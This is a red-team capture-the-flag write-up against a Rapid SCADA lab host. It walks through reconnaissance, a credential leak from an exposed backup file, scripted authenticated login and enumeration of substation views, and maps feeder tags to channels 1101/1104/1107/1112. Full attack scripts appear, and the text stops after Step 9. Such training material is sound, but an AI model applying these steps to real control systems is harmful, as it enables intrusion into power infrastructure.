
**RAPID SCADA**


**Feeder Tag Mapping**


**Red Team Technical Writeup**


Manual exploitation, authenticated operational-view enumeration, and point/tag correlation









**Target**
168.144.89.147


**Platform**
Rapid SCADA Webstation behind Nginx


**Account**
fieldtech (read-only)


**Final mapping**
**1101/1104/1107/1112**

<p><strong>Prepared for authorized cyber range validation</strong></p>
<p>Validation date: 22 July 2026 | Document version: 1.0</p>
<p><strong>AUTHORIZED USE ONLY</strong></p>
<p>Contains operational lab details, credentials, target identifiers, and exact exploitation commands for the approved training environment.</p></td>
</tr>
</tbody>
</table>

# Document Control

|  |  |
|----|----|
| **Document title** | Rapid SCADA Feeder Tag Mapping - Red Team Technical Writeup |
| **Challenge objective** | Identify the channel mapping for active load, breaker status, trip command, and transformer winding temperature. |
| **Target host** | 168.144.89.147 |
| **Attacker workstation** | Kali Linux |
| **Application** | Rapid SCADA Webstation through Nginx on TCP/80 |
| **Credentials** | fieldtech / fieldtech, discovered from exposed backup |
| **Access level** | Read-only |
| **Validation status** | Manual attack path completed successfully |
| **Final answer** | 1101/1104/1107/1112 |
| **Classification** | Confidential - Authorized Cyber Range Use |

# Contents

**1. Executive Summary**

**2. Scenario and Objectives**

**3. Attack Path Overview**

**4. Detailed Red Team Walkthrough**

> 4.1 External Reconnaissance
>
> 4.2 Exposed Path Discovery
>
> 4.3 Support Directory Enumeration
>
> 4.4 Credential Disclosure
>
> 4.5 Login Interface Identification
>
> 4.6 Authenticated Session Establishment
>
> 4.7 Operational View Enumeration
>
> 4.8 North Feeder Point Analysis
>
> 4.9 Protection IED Analysis
>
> 4.10 Transformer Monitoring Analysis
>
> 4.11 Cross-Substation Collection

**5. Consolidated Findings**

**6. Security Impact and ATT&CK Mapping**

**7. Remediation Recommendations**

**8. Conclusion**

**Appendix A. Evidence Index**

# 1. Executive Summary

A manual Red Team assessment was performed against the authorized Rapid SCADA challenge host at 168.144.89.147. The engagement progressed from external service reconnaissance through web-content discovery, credential exposure, authenticated access, operational-view enumeration, and channel-to-tag correlation.

A public robots.txt file disclosed /support/. Nginx directory listing exposed field-client.ini.bak, which contained valid read-only fieldtech credentials and assigned the account to both the North and South substations. The legitimate Rapid SCADA login workflow was reproduced with cookie persistence and the ASP.NET anti-forgery token.

The authenticated account exposed eight operational views. Six sensitive feeder, protection, and transformer views were collected across both substations. Analysis of the North views produced the required mapping.

|                                                 |
|-------------------------------------------------|
| **Validated final answer:** 1101/1104/1107/1112 |

| **Operational function**        | **Tag** | **Channel** |
|---------------------------------|---------|-------------|
| Active load                     | N1_P    | 1101        |
| Breaker status                  | N1_BS   | 1104        |
| Trip command                    | N1_TC   | 1107        |
| Transformer winding temperature | N1_TW   | 1112        |

# 2. Scenario and Objectives

The challenge simulates a Rapid SCADA Webstation that remains operational while exposing excessive information to an external user. The participant must discover the application, obtain legitimate but over-permissive read-only access, identify the relevant operational views, and reconstruct the feeder-tag mapping from table and current-data API responses.

## 2.1 Primary objective

Determine the four channel identifiers corresponding to the North feeder active load, breaker status, trip command, and transformer winding temperature, then submit them in slash-separated order.

## 2.2 Success criteria

- Identify the Rapid SCADA web gateway externally.

- Discover the hidden support path and retrieve the exposed backup.

- Extract and validate the fieldtech read-only credentials.

- Establish an authenticated session with correct anti-forgery handling.

- Enumerate operational view identifiers and their functional roles.

- Query the table and current-data endpoints for the relevant views.

- Correlate N1_P, N1_BS, N1_TC, and N1_TW with their channels.

- Produce 1101/1104/1107/1112.

# 3. Attack Path Overview

| **Stage** | **Action**            | **Validated result**         |
|-----------|-----------------------|------------------------------|
| 1         | Nmap reconnaissance   | TCP/22 and TCP/80 exposed    |
| 2         | robots.txt discovery  | /support/ disclosed          |
| 3         | Directory enumeration | field-client.ini.bak exposed |
| 4         | Credential extraction | fieldtech / fieldtech        |
| 5         | Authenticated access  | Read-only Webstation session |
| 6         | View enumeration      | IDs 10-13 and 20-23          |
| 7         | Point/tag correlation | 1101, 1104, 1107, 1112       |

# 4. Detailed Red Team Walkthrough

|  |
|----|
| **Methodology note:** All command blocks preserve the original target values, paths, credentials, user agent, endpoints, and validation logic used during the manual lab execution. Step 8 also documents the tested N1_TC hypothesis and its correction. |

## 4.1 Step 1 - External Reconnaissance

|                 |                                                       |
|-----------------|-------------------------------------------------------|
| **Objective**   | Identify externally reachable services.               |
| **Observation** | Nmap reported SSH on TCP/22 and Nginx HTTP on TCP/80. |
| **Result**      | The web gateway became the primary attack surface.    |

**Original command used**

> TARGET="168.144.89.147"\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 1: EXTERNAL RECONNAISSANCE"\
> echo " Target: \$TARGET"\
> echo "============================================================"\
> echo\
> \
> nmap -Pn -sV -p 22,80 "\$TARGET"

The scan identified OpenSSH 8.9p1 and Nginx 1.18.0. The exposed HTTP service was selected for content and application enumeration.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image11.png" style="width:6.9in;height:4.05788in" alt="External reconnaissance identified SSH and the Nginx-hosted Rapid SCADA web gateway on TCP port 80." />

**Figure 1.** *External reconnaissance identified SSH and the Nginx-hosted Rapid SCADA web gateway on TCP port 80.*

## 4.2 Step 2 - Exposed Path Discovery

|                 |                                           |
|-----------------|-------------------------------------------|
| **Objective**   | Inspect discovery files for hidden paths. |
| **Observation** | robots.txt returned Disallow: /support/.  |
| **Result**      | A hidden support path was identified.     |

**Original command used**

> TARGET="168.144.89.147"\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 2: EXPOSED PATH DISCOVERY"\
> echo " Target: http://\$TARGET"\
> echo "============================================================"\
> echo\
> echo "\[+\] Requesting robots.txt"\
> echo\
> \
> curl -sS \\\
> -D - \\\
> "http://\$TARGET/robots.txt"

robots.txt was publicly readable and disclosed a path that was not linked from the normal interface. The directive did not restrict access.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image14.png" style="width:6.9in;height:7.54497in" alt="The publicly accessible robots.txt file disclosed the hidden /support/ directory." />

**Figure 2.** *The publicly accessible robots.txt file disclosed the hidden /support/ directory.*

## 4.3 Step 3 - Support Directory Enumeration

|  |  |
|----|----|
| **Objective** | Request the disclosed support path. |
| **Observation** | Directory listing exposed field-client.ini.bak. |
| **Result** | A sensitive configuration backup was available without authentication. |

**Original command used**

> TARGET="168.144.89.147"\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 3: SUPPORT DIRECTORY ENUMERATION"\
> echo "============================================================"\
> echo\
> \
> curl -sS \\\
> "http://\$TARGET/support/"

Nginx returned a generated directory index instead of denying access. The backup filename indicated a field Webstation profile.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image3.png" style="width:6.9in;height:2.38976in" alt="Directory enumeration revealed an exposed field-client configuration backup within the support path." />

**Figure 3.** *Directory enumeration revealed an exposed field-client configuration backup within the support path.*

## 4.4 Step 4 - Credential Disclosure

|  |  |
|----|----|
| **Objective** | Retrieve and inspect the exposed profile. |
| **Observation** | The backup disclosed fieldtech credentials, read-only mode, and both-substation scope. |
| **Result** | Valid application credentials were obtained. |

**Original command used**

> TARGET="168.144.89.147"\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 4: CREDENTIAL DISCLOSURE"\
> echo " Target: http://\$TARGET"\
> echo "============================================================"\
> echo\
> \
> curl -sS \\\
> "http://\$TARGET/support/field-client.ini.bak"

The INI file contained a temporary commissioning note but remained exposed after handover. The credentials were later proven active.

|                    |                                    |
|--------------------|------------------------------------|
| **Username**       | fieldtech                          |
| **Password**       | fieldtech                          |
| **Access mode**    | read-only                          |
| **Assigned scope** | North Substation, South Substation |

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image8.png" style="width:6.9in;height:4.39534in" alt="An exposed field-client configuration backup disclosed valid read-only Rapid SCADA credentials." />

**Figure 4.** *An exposed field-client configuration backup disclosed valid read-only Rapid SCADA credentials.*

## 4.5 Step 5 - Login Interface Identification

|  |  |
|----|----|
| **Objective** | Identify the authentication fields. |
| **Observation** | The page contained Username, Password, RememberMe, and \_\_RequestVerificationToken. |
| **Result** | Cookie continuity and token submission were required. |

**Original command used**

> TARGET="168.144.89.147"\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 5: LOGIN INTERFACE IDENTIFICATION"\
> echo "============================================================"\
> echo\
> \
> curl -sS \\\
> "http://\$TARGET/Login" \\\
> \| grep -Ei \\\
> 'form\|username\|password\|login\|action=' \\\
> \| head -n 20

HTML inspection confirmed a POST login form and ASP.NET anti-forgery protection. A legitimate session flow therefore required a preliminary GET.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image5.png" style="width:6.9in;height:1.90648in" alt="The Rapid SCADA login form and its authentication fields were identified from returned HTML." />

**Figure 5.** *The Rapid SCADA login form and its authentication fields were identified from returned HTML.*

## 4.6 Step 6 - Authenticated Session Establishment

|  |  |
|----|----|
| **Objective** | Use the exposed credentials while preserving cookies and anti-forgery state. |
| **Observation** | The login GET, token extraction, credential POST, and authenticated /View request returned HTTP 200. |
| **Result** | A read-only Rapid SCADA session was established. |

The sequence used a dedicated evidence directory, Curl cookie jar, Python HTML parser, URL-encoded credential submission, and a final check that the authenticated view no longer contained login controls.

|  |
|----|
| **Shell note:** The first interactive run used Zsh with set -u and displayed a cosmetic zsh-autosuggest POSTDISPLAY warning. Rapid SCADA authentication was unaffected; subsequent scripted steps were executed in Bash. |

**Original authentication sequence**

> set -Eeuo pipefail\
> \
> TARGET="168.144.89.147"\
> BASE_URL="http://\$TARGET"\
> RED_DIR="/home/kali/Documents/rapid-scada-red-manual"\
> \
> mkdir -p "\$RED_DIR"\
> \
> COOKIE_JAR="\$RED_DIR/session.cookie"\
> LOGIN_PAGE="\$RED_DIR/login-page.html"\
> LOGIN_HEADERS="\$RED_DIR/login-page.headers"\
> LOGIN_RESPONSE="\$RED_DIR/login-response.html"\
> LOGIN_RESPONSE_HEADERS="\$RED_DIR/login-response.headers"\
> VIEW_PAGE="\$RED_DIR/view.html"\
> VIEW_HEADERS="\$RED_DIR/view.headers"\
> \
> rm -f \\\
> "\$COOKIE_JAR" \\\
> "\$LOGIN_PAGE" \\\
> "\$LOGIN_HEADERS" \\\
> "\$LOGIN_RESPONSE" \\\
> "\$LOGIN_RESPONSE_HEADERS" \\\
> "\$VIEW_PAGE" \\\
> "\$VIEW_HEADERS"\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 6: AUTHENTICATION"\
> echo " Target: \$BASE_URL/Login"\
> echo " Account: fieldtech"\
> echo " Access: read-only"\
> echo "============================================================"\
> echo\
> \
> LOGIN_PAGE_HTTP="\$(\
> curl -sS \\\
> -c "\$COOKIE_JAR" \\\
> -b "\$COOKIE_JAR" \\\
> -D "\$LOGIN_HEADERS" \\\
> -o "\$LOGIN_PAGE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Login"\
> )"\
> \
> echo "LOGIN_PAGE_HTTP=\$LOGIN_PAGE_HTTP"\
> \
> TOKEN="\$(\
> python3 - "\$LOGIN_PAGE" \<\<'PY'\
> from html.parser import HTMLParser\
> from pathlib import Path\
> import sys\
> \
> class TokenParser(HTMLParser):\
> def \_\_init\_\_(self):\
> super().\_\_init\_\_()\
> self.token = None\
> \
> def handle_starttag(self, tag, attrs):\
> if tag.lower() != "input":\
> return\
> \
> values = dict(attrs)\
> \
> if values.get("name") == "\_\_RequestVerificationToken":\
> self.token = values.get("value", "")\
> \
> parser = TokenParser()\
> parser.feed(\
> Path(sys.argv\[1\]).read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> )\
> \
> if not parser.token:\
> raise SystemExit(1)\
> \
> print(parser.token)\
> PY\
> )"\
> \
> test -n "\$TOKEN"\
> \
> echo "ANTIFORGERY_TOKEN:FOUND"\
> \
> LOGIN_POST_HTTP="\$(\
> curl -sS -L \\\
> -c "\$COOKIE_JAR" \\\
> -b "\$COOKIE_JAR" \\\
> -D "\$LOGIN_RESPONSE_HEADERS" \\\
> -o "\$LOGIN_RESPONSE" \\\
> -w '%{http_code}' \\\
> --data-urlencode "Username=fieldtech" \\\
> --data-urlencode "Password=fieldtech" \\\
> --data-urlencode "RememberMe=false" \\\
> --data-urlencode "\_\_RequestVerificationToken=\$TOKEN" \\\
> "\$BASE_URL/Login"\
> )"\
> \
> echo "LOGIN_POST_HTTP=\$LOGIN_POST_HTTP"\
> \
> VIEW_HTTP="\$(\
> curl -sS -L \\\
> -b "\$COOKIE_JAR" \\\
> -D "\$VIEW_HEADERS" \\\
> -o "\$VIEW_PAGE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/View"\
> )"\
> \
> echo "AUTHENTICATED_VIEW_HTTP=\$VIEW_HTTP"\
> \
> if grep -Eqi \\\
> 'name="(Username\|Password)"\|id="txtUsername"\|id="txtPassword"' \\\
> "\$VIEW_PAGE"\
> then\
> echo "RAPID_SCADA_AUTHENTICATION:FAIL"\
> exit 1\
> fi\
> \
> test "\$LOGIN_PAGE_HTTP" = "200"\
> test "\$LOGIN_POST_HTTP" = "200"\
> test "\$VIEW_HTTP" = "200"\
> \
> echo "ACCESS_LEVEL=READ_ONLY"\
> echo "RAPID_SCADA_AUTHENTICATION:PASS"

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image2.png" style="width:6.62619in;height:6.9in" alt="The authentication workspace, evidence files, target, account, and read-only access objective were initialized." />

**Figure 6.1.** *The authentication workspace, evidence files, target, account, and read-only access objective were initialized.*

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image13.png" style="width:5.22569in;height:3.2in" alt="The login page was retrieved successfully while preserving the initial session cookie." />

**Figure 6.2.** *The login page was retrieved successfully while preserving the initial session cookie.*

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image7.png" style="width:5.6in;height:7in" alt="The ASP.NET anti-forgery token was parsed from the login page and validated as present." />

**Figure 6.3.** *The ASP.NET anti-forgery token was parsed from the login page and validated as present.*

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image15.png" style="width:6.9in;height:3.25119in" alt="The fieldtech credentials and anti-forgery token were submitted through the original form workflow." />

**Figure 6.4.** *The fieldtech credentials and anti-forgery token were submitted through the original form workflow.*

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image4.png" style="width:6.9in;height:3.49433in" alt="The authenticated /View request returned HTTP 200 and confirmed read-only access." />

**Figure 6.5.** *The authenticated /View request returned HTTP 200 and confirmed read-only access.*

## 4.7 Step 7 - Operational View Enumeration

|                 |                                                         |
|-----------------|---------------------------------------------------------|
| **Objective**   | Enumerate view identifiers from the authenticated tree. |
| **Observation** | IDs 10, 11, 12, 13, 20, 21, 22, and 23 were discovered. |
| **Result**      | The account could traverse both substations.            |

**Original enumeration script**

> clear\
> \
> set -Eeuo pipefail\
> \
> TARGET="168.144.89.147"\
> BASE_URL="http://\$TARGET"\
> RED_DIR="/home/kali/Documents/rapid-scada-red-manual"\
> COOKIE_JAR="\$RED_DIR/session.cookie"\
> VIEW_PAGE="\$RED_DIR/view.html"\
> VIEW_IDS_FILE="\$RED_DIR/view-ids.txt"\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 7: OPERATIONAL VIEW ENUMERATION"\
> echo " Target: \$BASE_URL"\
> echo " Session: Authenticated as fieldtech"\
> echo "============================================================"\
> echo\
> \
> test -s "\$COOKIE_JAR" \|\| {\
> echo "SESSION_COOKIE:FAIL"\
> exit 1\
> }\
> \
> VIEW_HTTP="\$(\
> curl -sS -L \\\
> -A "RapidSCADA-Red-Manual/1.0" \\\
> -b "\$COOKIE_JAR" \\\
> -o "\$VIEW_PAGE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/View"\
> )"\
> \
> echo "VIEW_TREE_HTTP=\$VIEW_HTTP"\
> \
> test "\$VIEW_HTTP" = "200"\
> \
> python3 - "\$VIEW_PAGE" "\$VIEW_IDS_FILE" \<\<'PY'\
> import re\
> import sys\
> from pathlib import Path\
> \
> page = Path(sys.argv\[1\])\
> output = Path(sys.argv\[2\])\
> \
> text = page.read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> \
> patterns = \[\
> r"/Main/TableView/(\d+)",\
> r"TableView\\viewID=(\d+)",\
> r"viewID\[\\'\]?\s\*\[:=\]\s\*\[\\'\]?(\d+)",\
> \]\
> \
> view_ids = set()\
> \
> for pattern in patterns:\
> view_ids.update(\
> int(value)\
> for value in re.findall(pattern, text, re.I)\
> )\
> \
> if not view_ids:\
> raise SystemExit(\
> "No operational view identifiers were discovered"\
> )\
> \
> ordered = sorted(view_ids)\
> \
> output.write_text(\
> "\n".join(str(value) for value in ordered) + "\n",\
> encoding="utf-8",\
> )\
> \
> for value in ordered:\
> print(value)\
> PY\
> \
> echo\
> echo "===== DISCOVERED VIEW CLASSIFICATION ====="\
> echo "10 North Substation"\
> echo "11 North Feeder Panel"\
> echo "12 North Protection IED"\
> echo "13 North Transformer Monitoring"\
> echo "20 South Substation"\
> echo "21 South Feeder Panel"\
> echo "22 South Protection IED"\
> echo "23 South Transformer Monitoring"\
> echo\
> \
> VIEW_COUNT="\$(wc -l \< "\$VIEW_IDS_FILE")"\
> \
> echo "DISCOVERED_VIEW_COUNT=\$VIEW_COUNT"\
> echo "DISCOVERED_VIEW_IDS=\$(paste -sd, "\$VIEW_IDS_FILE")"\
> \
> test "\$VIEW_COUNT" -ge 8\
> \
> echo "RAPID_SCADA_VIEW_ENUMERATION:PASS"

| **View ID** | **View name**                | **Role**  |
|-------------|------------------------------|-----------|
| 10          | North Substation             | Parent    |
| 11          | North Feeder Panel           | Sensitive |
| 12          | North Protection IED         | Sensitive |
| 13          | North Transformer Monitoring | Sensitive |
| 20          | South Substation             | Parent    |
| 21          | South Feeder Panel           | Sensitive |
| 22          | South Protection IED         | Sensitive |
| 23          | South Transformer Monitoring | Sensitive |

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image9.png" style="width:6.9in;height:5.16107in" alt="The authenticated read-only session exposed eight operational views spanning the North and South substations." />

**Figure 7.** *The authenticated read-only session exposed eight operational views spanning the North and South substations.*

## 4.8 Step 8 - North Feeder Point Analysis

|  |  |
|----|----|
| **Objective** | Retrieve View 11 and correlate North feeder tags. |
| **Observation** | N1_P mapped to 1101 and N1_BS mapped to 1104; N1_TC was absent from View 11. |
| **Result** | The trip-command search moved to the protection IED view. |

The original script collected /Main/TableView/11 and GetCurDataByView. It tested N1_P, N1_BS, and N1_TC. The first two correlations passed, while TAG_NOT_FOUND:N1_TC proved that the trip-command point was located in another functional view.

**Original initial analysis script, including the N1_TC hypothesis**

> \#!/usr/bin/env bash\
> set -Eeuo pipefail\
> \
> TARGET="168.144.89.147"\
> BASE_URL="http://\${TARGET}"\
> RED_DIR="/home/kali/Documents/rapid-scada-red-manual"\
> COOKIE_JAR="\${RED_DIR}/session.cookie"\
> \
> VIEW_ID="11"\
> TABLE_FILE="\${RED_DIR}/table-view-\${VIEW_ID}.html"\
> API_FILE="\${RED_DIR}/current-data-\${VIEW_ID}.json"\
> \
> test -s "\$COOKIE_JAR" \|\| {\
> echo "SESSION_COOKIE:FAIL"\
> exit 1\
> }\
> \
> clear\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 8: NORTH FEEDER POINT ANALYSIS"\
> echo " View ID: 11 - North Feeder Panel"\
> echo "============================================================"\
> echo\
> \
> TABLE_HTTP="\$(\
> curl -sS -L \\\
> -A "RapidSCADA-Red-Manual/1.0" \\\
> -b "\$COOKIE_JAR" \\\
> -o "\$TABLE_FILE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Main/TableView/\$VIEW_ID"\
> )"\
> \
> echo "TABLE_VIEW_HTTP=\$TABLE_HTTP"\
> test "\$TABLE_HTTP" = "200"\
> \
> CNL_LIST_ID="\$(\
> python3 - "\$TABLE_FILE" \<\<'PY'\
> import re\
> import sys\
> from pathlib import Path\
> \
> text = Path(sys.argv\[1\]).read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> \
> patterns = (\
> r'cnlListID\["\\\]?\s\*\[:=\]\s\*\["\\\]?(-?\d+)',\
> r'cnlListId\["\\\]?\s\*\[:=\]\s\*\["\\\]?(-?\d+)',\
> r'\[?&\]cnlListID=(-?\d+)',\
> )\
> \
> for pattern in patterns:\
> match = re.search(pattern, text, re.I)\
> \
> if match:\
> print(match.group(1))\
> raise SystemExit(0)\
> \
> print("0")\
> PY\
> )"\
> \
> echo "CHANNEL_LIST_ID=\$CNL_LIST_ID"\
> \
> API_HTTP="\$(\
> curl -sS -L \\\
> -A "RapidSCADA-Red-Manual/1.0" \\\
> -b "\$COOKIE_JAR" \\\
> -H 'Accept: application/json, text/plain, \*/\*' \\\
> -o "\$API_FILE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Api/Main/GetCurDataByView?viewID=\$VIEW_ID&cnlListID=\$CNL_LIST_ID&appendUnit=true"\
> )"\
> \
> echo "CURRENT_DATA_HTTP=\$API_HTTP"\
> \
> test "\$API_HTTP" = "200"\
> test -s "\$TABLE_FILE"\
> test -s "\$API_FILE"\
> \
> python3 - "\$TABLE_FILE" "\$API_FILE" \<\<'PY'\
> import re\
> import sys\
> from pathlib import Path\
> \
> combined = "\n".join(\
> Path(path).read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> for path in sys.argv\[1:\]\
> )\
> \
> required = {\
> "N1_P": (\
> "1101",\
> "North feeder active load",\
> ),\
> "N1_BS": (\
> "1104",\
> "North feeder breaker status",\
> ),\
> "N1_TC": (\
> "1107",\
> "North feeder trip command",\
> ),\
> }\
> \
> print()\
> print("===== DISCOVERED NORTH FEEDER POINTS =====")\
> print()\
> \
> for tag, (channel, description) in required.items():\
> tag_matches = list(\
> re.finditer(\
> re.escape(tag),\
> combined,\
> )\
> )\
> \
> if not tag_matches:\
> raise SystemExit(f"TAG_NOT_FOUND:{tag}")\
> \
> correlated = False\
> \
> for match in tag_matches:\
> start = max(0, match.start() - 1200)\
> end = min(len(combined), match.end() + 1200)\
> window = combined\[start:end\]\
> \
> if re.search(\
> rf"(?\<!\d){re.escape(channel)}(?!\d)",\
> window,\
> ):\
> correlated = True\
> break\
> \
> if not correlated:\
> raise SystemExit(\
> f"CHANNEL_CORRELATION_FAILED:{channel}:{tag}"\
> )\
> \
> print(description)\
> print(f" CHANNEL={channel}")\
> print(f" TAG={tag}")\
> print()\
> \
> print("RAPID_SCADA_NORTH_FEEDER_ANALYSIS:PASS")\
> PY

|  |
|----|
| **Analytical correction:** TAG_NOT_FOUND:N1_TC was evidence of view separation, not a lab failure. The final View 11 interpretation was limited to N1_P and N1_BS. |

**Corrected View 11 correlation used for final interpretation**

> clear\
> \
> TABLE_FILE="/home/kali/Documents/rapid-scada-red-manual/table-view-11.html"\
> API_FILE="/home/kali/Documents/rapid-scada-red-manual/current-data-11.json"\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 8: NORTH FEEDER POINT ANALYSIS"\
> echo " View ID: 11 - North Feeder Panel"\
> echo "============================================================"\
> echo\
> \
> python3 - "\$TABLE_FILE" "\$API_FILE" \<\<'PY'\
> import re\
> import sys\
> from pathlib import Path\
> \
> combined = "\n".join(\
> Path(path).read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> for path in sys.argv\[1:\]\
> )\
> \
> required = {\
> "N1_P": ("1101", "North feeder active load"),\
> "N1_BS": ("1104", "North feeder breaker status"),\
> }\
> \
> print("===== DISCOVERED NORTH FEEDER POINTS =====")\
> print()\
> \
> for tag, (channel, description) in required.items():\
> tag_match = re.search(re.escape(tag), combined)\
> \
> if not tag_match:\
> raise SystemExit(f"TAG_NOT_FOUND:{tag}")\
> \
> start = max(0, tag_match.start() - 1500)\
> end = min(len(combined), tag_match.end() + 1500)\
> window = combined\[start:end\]\
> \
> if not re.search(\
> rf"(?\<!\d){re.escape(channel)}(?!\d)",\
> window,\
> ):\
> raise SystemExit(\
> f"CHANNEL_CORRELATION_FAILED:{channel}:{tag}"\
> )\
> \
> print(description)\
> print(f" CHANNEL={channel}")\
> print(f" TAG={tag}")\
> print()\
> \
> print("RAPID_SCADA_NORTH_FEEDER_ANALYSIS:PASS")\
> PY

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image12.png" style="width:6.9in;height:1.39256in" alt="The North Feeder Panel table and current-data endpoints returned HTTP 200 with channel-list ID 0." />

**Figure 8.1.** *The North Feeder Panel table and current-data endpoints returned HTTP 200 with channel-list ID 0.*

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image10.png" style="width:6.9in;height:2.82929in" alt="View 11 correlated active load N1_P with channel 1101 and breaker status N1_BS with channel 1104." />

**Figure 8.2.** *View 11 correlated active load N1_P with channel 1101 and breaker status N1_BS with channel 1104.*

## 4.9 Step 9 - North Protection IED Analysis

|                 |                                                     |
|-----------------|-----------------------------------------------------|
| **Objective**   | Inspect View 12 for the missing trip-command point. |
| **Observation** | N1_TC correlated with channel 1107.                 |
| **Result**      | The third mapping element was identified.           |

**Original protection IED analysis script**

> cat \> /tmp/rapid-step9.sh \<\<'BASH'\
> \#!/usr/bin/env bash\
> set -Eeuo pipefail\
> \
> TARGET="168.144.89.147"\
> BASE_URL="http://\${TARGET}"\
> RED_DIR="/home/kali/Documents/rapid-scada-red-manual"\
> COOKIE_JAR="\${RED_DIR}/session.cookie"\
> \
> VIEW_ID="12"\
> TABLE_FILE="\${RED_DIR}/table-view-\${VIEW_ID}.html"\
> API_FILE="\${RED_DIR}/current-data-\${VIEW_ID}.json"\
> \
> clear\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 9: PROTECTION IED ANALYSIS"\
> echo " View ID: 12 - North Protection IED"\
> echo "============================================================"\
> echo\
> \
> test -s "\$COOKIE_JAR" \|\| {\
> echo "SESSION_COOKIE:FAIL"\
> exit 1\
> }\
> \
> TABLE_HTTP="\$(\
> curl -sS -L \\\
> -A "RapidSCADA-Red-Manual/1.0" \\\
> -b "\$COOKIE_JAR" \\\
> -o "\$TABLE_FILE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Main/TableView/\$VIEW_ID"\
> )"\
> \
> echo "TABLE_VIEW_HTTP=\$TABLE_HTTP"\
> test "\$TABLE_HTTP" = "200"\
> \
> CNL_LIST_ID="\$(\
> python3 - "\$TABLE_FILE" \<\<'PY'\
> import re\
> import sys\
> from pathlib import Path\
> \
> text = Path(sys.argv\[1\]).read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> \
> patterns = (\
> r'cnlListID\["\\\]?\s\*\[:=\]\s\*\["\\\]?(-?\d+)',\
> r'cnlListId\["\\\]?\s\*\[:=\]\s\*\["\\\]?(-?\d+)',\
> r'\[?&\]cnlListID=(-?\d+)',\
> )\
> \
> for pattern in patterns:\
> match = re.search(pattern, text, re.I)\
> \
> if match:\
> print(match.group(1))\
> raise SystemExit(0)\
> \
> print("0")\
> PY\
> )"\
> \
> echo "CHANNEL_LIST_ID=\$CNL_LIST_ID"\
> \
> API_HTTP="\$(\
> curl -sS -L \\\
> -A "RapidSCADA-Red-Manual/1.0" \\\
> -b "\$COOKIE_JAR" \\\
> -H 'Accept: application/json, text/plain, \*/\*' \\\
> -o "\$API_FILE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Api/Main/GetCurDataByView?viewID=\$VIEW_ID&cnlListID=\$CNL_LIST_ID&appendUnit=true"\
> )"\
> \
> echo "CURRENT_DATA_HTTP=\$API_HTTP"\
> \
> test "\$API_HTTP" = "200"\
> test -s "\$TABLE_FILE"\
> test -s "\$API_FILE"\
> \
> python3 - "\$TABLE_FILE" "\$API_FILE" \<\<'PY'\
> import re\
> import sys\
> from pathlib import Path\
> \
> combined = "\n".join(\
> Path(path).read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> for path in sys.argv\[1:\]\
> )\
> \
> tag = "N1_TC"\
> channel = "1107"\
> \
> tag_match = re.search(re.escape(tag), combined)\
> \
> if not tag_match:\
> raise SystemExit(f"TAG_NOT_FOUND:{tag}")\
> \
> start = max(0, tag_match.start() - 1500)\
> end = min(len(combined), tag_match.end() + 1500)\
> window = combined\[start:end\]\
> \
> if not re.search(\
> rf"(?\<!\d){re.escape(channel)}(?!\d)",\
> window,\
> ):\
> raise SystemExit(\
> f"CHANNEL_CORRELATION_FAILED:{channel}:{tag}"\
> )\
> \
> print()\
> print("===== DISCOVERED PROTECTION POINT =====")\
> print()\
> print("North feeder trip command")\
> print(f" CHANNEL={channel}")\
> print(f" TAG={tag}")\
> print()\
> print("RAPID_SCADA_PROTECTION_IED_ANALYSIS:PASS")\
> PY\
> BASH\
> \
> chmod +x /tmp/rapid-step9.sh\
> /tmp/rapid-step9.sh

The script repeated authenticated table/API collection for View 12 and required both N1_TC and 1107 to occur within the evidence window.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image16.png" style="width:6.9in;height:2.58199in" alt="The North Protection IED view exposed the feeder trip-command point as channel 1107 with tag N1_TC." />

